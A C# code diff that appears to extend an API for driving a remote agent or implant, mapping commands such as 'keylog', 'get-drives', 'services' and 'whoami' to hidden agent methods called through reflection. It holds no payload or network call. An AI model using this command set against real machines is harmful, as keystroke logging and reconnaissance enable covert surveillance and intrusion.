@@ -18,6 +18,17 @@ namespace NHAPI
         private MethodInfo writeColourToDisplay;
         private MethodInfo writeColour;
 
+        private Dictionary<string, string> commandToMethodMap = new Dictionary<string, string>
+        {
+            { "applist", "AppList" },
+            { "get-drives", "GetDrivesCommand" },
+            { "keylog", "KeyLogger" },
+            { "ls", "GetDirectoryCommand" },
+            { "lua", "LUA" },
+            { "services", "ServiceList" },
+            { "whoami", "Whoami" }
+        };
+
         public Functions(object CurrentAgent)
         {
             this.CurrentAgent = CurrentAgent;
@@ -160,7 +171,26 @@ namespace NHAPI
             }
         }
 
-        
+        private string GetMethodName(string command)
+        {
+            string methodName;
+            if (!commandToMethodMap.TryGetValue(command.ToLowerInvariant(), out methodName))
+            {
+                methodName = command;
+            }
+            return methodName;
+        }
+
+        public bool NHCommand(string command, string args = "")
+        {
+            return (bool)agentType.GetMethod(GetMethodName(command), BindingFlags.Instance | BindingFlags.NonPublic).Invoke(CurrentAgent, new object[] { args });
+        }
+
+        public Guid NHCommand_RetrieveResults(string command, string args = "")
+        {
+            return CallFunctionGetGuid(agentType.GetMethod(GetMethodName(command), BindingFlags.Instance | BindingFlags.NonPublic), new object[] { args });
+        }
+
         public static string PS(object CurrentAgent)
         {
             return "";
